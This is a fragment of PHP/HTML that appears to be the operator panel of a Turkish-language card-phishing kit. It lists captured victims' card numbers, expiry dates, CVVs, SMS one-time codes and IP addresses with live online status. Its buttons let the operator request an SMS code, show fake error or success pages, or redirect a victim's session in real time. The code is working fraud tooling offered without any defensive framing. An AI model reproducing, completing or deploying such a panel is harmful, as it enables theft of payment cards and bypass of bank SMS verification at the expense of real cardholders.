	...
	<table class="table">
      ...
      <tbody>
        ...
        <tr>
          ...
          <td style="color:#333"><b><?php echo $oku['kk']; ?></b></td>
		  <td style="color:#333"><b><?php echo $oku['sonkul']; ?></b></td>>
		  <td style="color:#333"><b><?php echo $oku['cvv']; ?></b></td>
		  <td style="color:#333"><b><?php echo $oku['sms']; ?></b></td>
		  ...
		  <td style="color:#333"><b><?php echo $oku['ip']; ?> <?=($oku['lastOnline'] > time() ? '(Aktif <i style="color: yellow !important" class="fas fa-circle"></i>)' : '(Çevrimdışı <i style="color: red !important" class="fas fa-circle"></i>)')?></b></td>
            <td style="padding:1px;color:#333"><a href="?dondur=<?php echo $oku['ip']; ?>"><button>BAŞA DÖNDÜR</button></a><a href="?sms=<?php echo $oku['ip']; ?>"><button>SMS İSTE</button></a> <br><a href="?tebrik=<?php echo $oku['ip']; ?>"><button>TEBRIKLE</button></a> <a href="?hata=<?php echo $oku['ip']; ?>"><button>HATA VER</button></a> <a href="?ban=<?php echo $oku['ip']; ?>"><button><i class="fa fa-ban"></i></button></a> <a href="?sil=<?php echo $oku['id']; ?>"><button><i class="fa fa-trash"></i></button></a><br> <form action="" method="GET" STYLE="margin-top:-25px;margin-left:180px;"><select style="border-left-color:#32a4a8;" name="go" id="yolla">
  <option name="1" value="1">Anasayfaya</option>
  <option name="2" value="2">Bilgiler Sayfasına</option>
  <option name="3" value="3">Bekle Sayfasına</option>
  <option name="4" value="4">Hata sayfasına</option>
  <option name="5" value="5">Tebrik sayfasına</option>
                </select><input type="hidden" name="go_ip" value="<?php echo $oku['ip']; ?>"><button style="border-left:none;border-right-color:#32a4a8;" >YOLLA</button></td>
        </tr>
          </form><?php } ?>
      </tbody>
    </table>
